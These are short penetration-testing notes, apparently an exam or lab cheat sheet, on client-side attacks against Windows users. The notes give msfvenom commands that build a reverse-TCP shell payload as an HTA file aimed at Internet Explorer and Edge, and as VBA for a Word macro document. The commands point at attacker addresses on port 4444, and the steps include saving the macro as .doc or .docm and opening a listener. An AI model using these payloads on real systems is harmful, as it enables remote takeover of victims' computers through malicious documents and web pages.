### http application attack(works against Internet Explorer and to some extent Microsoft Edge)
```
1. msfvenom -p windows/shell_reverse_tcp(windows/x64/shell_reverse_tcp) LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
```

### office word macro development(vba script)
```
1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.4 LPORT=4444 -f vba -o evil
2. open word document and edit macro, copy paste then save as doc or docm, docx doesn't work
3. open a listener
```
